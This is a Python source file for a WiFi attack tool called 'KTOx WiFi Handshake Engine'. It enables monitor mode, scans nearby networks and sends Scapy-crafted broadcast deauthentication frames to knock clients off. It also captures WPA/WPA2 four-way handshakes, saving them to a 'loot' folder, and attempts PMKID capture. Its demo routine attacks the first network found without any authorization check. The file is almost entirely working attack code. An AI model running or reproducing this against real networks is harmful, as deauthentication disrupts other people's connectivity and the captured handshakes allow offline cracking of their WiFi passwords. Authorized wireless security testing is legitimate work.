#!/usr/bin/env python3
"""
KTOx WiFi Handshake Engine
===========================
Comprehensive WiFi attack engine for:
- Monitor mode management
- Network scanning
- 4-way handshake capture (WPA/WPA2)
- Deauthentication attacks
- PMKID capture

Uses Scapy for fine-grained packet control and validation.

Author: KTOx Development
"""

import os
import sys
import time
import threading
import subprocess
from datetime import datetime
from collections import defaultdict
import logging

try:
    from scapy.all import (
        Dot11, Dot11Beacon, Dot11Deauth, Dot11ProbeResp,
        RadioTap, EAPOL, sendp, sniff, wrpcap, get_if_hwaddr,
        conf, Ether, IP, UDP, DHCP
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Set up logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

KTOX_DIR = os.environ.get("KTOX_DIR", "/root/KTOx")
LOOT_DIR = os.path.join(KTOX_DIR, "loot")


class WiFiEngine:
    """Main WiFi attack engine."""

    def __init__(self):
        self.mon_iface = None
        self.networks = {}  # {bssid: {essid, channel, clients, packets}}
        self.handshakes = defaultdict(list)  # {bssid: [eapol_packets]}
        self.running = False
        self.capture_filter = None

    def is_scapy_available(self):
        """Check if Scapy is available."""
        return SCAPY_AVAILABLE

    def enable_monitor_mode(self, iface="wlan0"):
        """Enable monitor mode on interface using airmon-ng or iw."""
        try:
            logger.info(f"Enabling monitor mode on {iface}...")

            # Kill interfering processes
            subprocess.run(
                ["airmon-ng", "check", "kill"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=10
            )

            # Try airmon-ng first
            result = subprocess.run(
                ["airmon-ng", "start", iface],
                capture_output=True,
                text=True,
                timeout=20
            )

            if result.returncode == 0:
                # Extract monitor interface name from output
                import re
                match = re.search(r'monitor mode enabled on (\w+)', result.stdout)
                if match:
                    self.mon_iface = match.group(1)
                    logger.info(f"Monitor mode enabled: {self.mon_iface}")
                    return True

            # Fallback to iw
            logger.info("Trying iw fallback...")
            subprocess.run(["systemctl", "stop", "NetworkManager"],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            subprocess.run(["ip", "link", "set", iface, "down"],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            subprocess.run(["iw", "dev", iface, "set", "type", "monitor"],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            subprocess.run(["ip", "link", "set", iface, "up"],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)

            self.mon_iface = iface
            logger.info(f"Monitor mode enabled (iw): {self.mon_iface}")
            return True

        except Exception as e:
            logger.error(f"Failed to enable monitor mode: {e}")
            return False

    def disable_monitor_mode(self):
        """Disable monitor mode and restore managed mode."""
        if not self.mon_iface:
            return True

        try:
            logger.info(f"Disabling monitor mode on {self.mon_iface}...")

            subprocess.run(
                ["airmon-ng", "stop", self.mon_iface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=10
            )

            subprocess.run(
                ["systemctl", "start", "NetworkManager"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=8
            )

            self.mon_iface = None
            logger.info("Monitor mode disabled")
            return True

        except Exception as e:
            logger.error(f"Failed to disable monitor mode: {e}")
            return False

    def set_channel(self, channel):
        """Set monitor interface to specific channel."""
        if not self.mon_iface:
            logger.error("Monitor interface not set")
            return False

        try:
            subprocess.run(
                ["iw", "dev", self.mon_iface, "set", "channel", str(channel)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=5
            )
            logger.info(f"Set channel: {channel}")
            return True
        except Exception as e:
            logger.error(f"Failed to set channel: {e}")
            return False

    def scan_networks(self, timeout=15):
        """Scan for WiFi networks."""
        if not self.mon_iface:
            logger.error("Monitor interface not set")
            return False

        try:
            logger.info(f"Scanning networks for {timeout} seconds...")

            # Use airodump-ng for reliable scanning
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            tmp_dir = f"/tmp/ktox_wifi_scan_{ts}"
            os.makedirs(tmp_dir, exist_ok=True)

            proc = subprocess.Popen(
                ["airodump-ng", "--output-format", "csv",
                 "--write", f"{tmp_dir}/scan", f"{self.mon_iface}"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            time.sleep(timeout)
            proc.terminate()
            proc.wait(timeout=5)

            # Parse results
            import csv
            import glob

            self.networks.clear()
            for csv_file in glob.glob(f"{tmp_dir}/scan*.csv"):
                try:
                    with open(csv_file, 'r', errors='ignore') as f:
                        reader = csv.reader(f)
                        for row in reader:
                            if len(row) < 14:
                                continue

                            bssid = row[0].strip()
                            if not bssid or ":" not in bssid or bssid == "BSSID":
                                continue

                            channel = row[3].strip()
                            essid = row[13].strip() if len(row) > 13 else ""
                            signal = row[8].strip() if len(row) > 8 else "?"

                            if not channel.isdigit():
                                continue

                            self.networks[bssid] = {
                                'essid': essid or "[HIDDEN]",
                                'channel': int(channel),
                                'signal': signal,
                                'clients': set(),
                                'packets': []
                            }

                except Exception as e:
                    logger.error(f"Error parsing CSV: {e}")

            logger.info(f"Found {len(self.networks)} networks")
            return len(self.networks) > 0

        except Exception as e:
            logger.error(f"Scan failed: {e}")
            return False

    def get_networks_list(self):
        """Return list of discovered networks."""
        return [
            (bssid, info['essid'], info['channel'], info['signal'])
            for bssid, info in self.networks.items()
        ]

    def deauth_network(self, bssid, count=10, pps=10):
        """Send deauthentication frames to a network."""
        if not self.mon_iface:
            logger.error("Monitor interface not set")
            return False

        try:
            logger.info(f"Sending {count} deauth frames to {bssid}...")

            # Get interface MAC
            iface_mac = get_if_hwaddr(self.mon_iface)

            # Create deauth frame
            frame = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)

            # Send deauth frames
            for i in range(count):
                sendp(frame, iface=self.mon_iface, verbose=False)
                if pps > 0:
                    time.sleep(1.0 / pps)

            logger.info(f"Deauth sent to {bssid}")
            return True

        except Exception as e:
            logger.error(f"Deauth failed: {e}")
            return False

    def capture_handshake(self, bssid, essid, channel, timeout=30, deauth_count=5):
        """Capture WPA/WPA2 4-way handshake for target network."""
        if not self.mon_iface:
            logger.error("Monitor interface not set")
            return False

        try:
            logger.info(f"Capturing handshake for {essid} ({bssid})...")

            # Set channel
            self.set_channel(channel)
            time.sleep(1)

            # Setup packet capture
            handshake_packets = []
            eapol_count = [0]  # Use list for mutable reference in nested function

            def packet_handler(pkt):
                """Handle captured packets."""
                # Look for EAPOL frames (4-way handshake)
                if pkt.haslayer(EAPOL):
                    if pkt[Dot11].addr2 == bssid or pkt[Dot11].addr3 == bssid:
                        handshake_packets.append(pkt)
                        eapol_count[0] += 1
                        logger.info(f"EAPOL frame captured ({eapol_count[0]})")

                        # We need all 4 EAPOL messages or at least 2-3
                        if eapol_count[0] >= 2:
                            # Handshake likely captured
                            pass

            # Start packet capture in background
            capture_thread = threading.Thread(
                target=lambda: sniff(
                    iface=self.mon_iface,
                    prn=packet_handler,
                    timeout=timeout,
                    store=False
                )
            )
            capture_thread.daemon = True
            capture_thread.start()

            # Wait a moment for capture to start
            time.sleep(1)

            # Send deauthentication to force handshake
            logger.info(f"Sending {deauth_count} deauth frames...")
            self.deauth_network(bssid, count=deauth_count, pps=2)

            # Wait for handshake capture
            capture_thread.join(timeout=timeout + 5)

            # Save captured packets
            if handshake_packets and eapol_count[0] >= 2:
                os.makedirs(f"{LOOT_DIR}/handshakes", exist_ok=True)
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                pcap_file = f"{LOOT_DIR}/handshakes/hs_{essid.replace(' ', '_')}_{bssid.replace(':', '')}_{ts}.pcap"

                wrpcap(pcap_file, handshake_packets)
                logger.info(f"Handshake saved: {pcap_file}")
                logger.info(f"Captured {eapol_count[0]} EAPOL frames")
                return True
            else:
                logger.warning(f"Insufficient handshake data captured (EAPOL frames: {eapol_count[0]})")
                return False

        except Exception as e:
            logger.error(f"Handshake capture failed: {e}")
            return False

    def pmkid_attack(self, bssid, essid, channel, timeout=10):
        """Attempt to capture PMKID from association request."""
        if not self.mon_iface:
            logger.error("Monitor interface not set")
            return False

        try:
            logger.info(f"Attempting PMKID capture for {essid} ({bssid})...")

            self.set_channel(channel)
            time.sleep(1)

            # This would require more advanced packet crafting
            # For now, use the established airodump-ng method
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            tmp_dir = f"/tmp/ktox_pmkid_{ts}"
            os.makedirs(tmp_dir, exist_ok=True)

            proc = subprocess.Popen(
                ["airodump-ng", "-c", str(channel), "--bssid", bssid,
                 "-w", f"{tmp_dir}/pmkid", self.mon_iface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            time.sleep(timeout)
            proc.terminate()
            proc.wait(timeout=5)

            logger.info("PMKID capture completed")
            return True

        except Exception as e:
            logger.error(f"PMKID attack failed: {e}")
            return False


# Singleton instance
_wifi_engine = None

def get_wifi_engine():
    """Get or create WiFi engine instance."""
    global _wifi_engine
    if _wifi_engine is None:
        _wifi_engine = WiFiEngine()
    return _wifi_engine


if __name__ == "__main__":
    # Demo usage
    if not SCAPY_AVAILABLE:
        print("ERROR: Scapy not installed. Install with: pip install scapy")
        sys.exit(1)

    engine = get_wifi_engine()

    print("KTOx WiFi Handshake Engine - Demo")
    print("=" * 50)

    # Enable monitor mode
    if engine.enable_monitor_mode("wlan0"):
        print(f"✓ Monitor mode enabled: {engine.mon_iface}")

        # Scan for networks
        if engine.scan_networks(timeout=10):
            networks = engine.get_networks_list()
            print(f"\n✓ Found {len(networks)} networks:")
            for i, (bssid, essid, ch, signal) in enumerate(networks):
                print(f"  [{i}] {essid:30} ({bssid}) Ch{ch:2} Sig{signal:>3}dBm")

            # Example: capture handshake for first network
            if networks:
                bssid, essid, ch, _ = networks[0]
                print(f"\nCapturing handshake for: {essid}")
                if engine.capture_handshake(bssid, essid, ch):
                    print("✓ Handshake captured successfully!")
                else:
                    print("✗ Failed to capture handshake")

        # Disable monitor mode
        engine.disable_monitor_mode()
        print(f"\n✓ Monitor mode disabled")
    else:
        print("✗ Failed to enable monitor mode")
